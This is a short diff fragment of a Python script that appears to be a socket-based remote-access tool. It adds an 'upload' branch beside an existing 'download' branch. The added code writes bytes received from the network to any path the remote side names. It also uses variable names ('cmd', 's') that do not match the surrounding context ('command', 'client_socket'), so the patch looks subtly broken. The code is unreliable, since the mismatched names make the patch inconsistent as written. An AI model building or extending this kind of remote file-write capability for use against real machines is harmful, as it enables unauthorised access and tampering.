@@ -25,3 +25,11 @@ elif command.startswith("download "):
         data = client_socket.recv(1024 * 100)
         f.write(data)
     print(f"[+] File {filename} downloaded.")
+
+#upload files#
+
+elif cmd.startswith("upload "):
+    path = cmd.split(" ", 1)[1]
+    file_data = s.recv(1024 * 100)
+    with open(path, "wb") as f:
+        f.write(file_data)
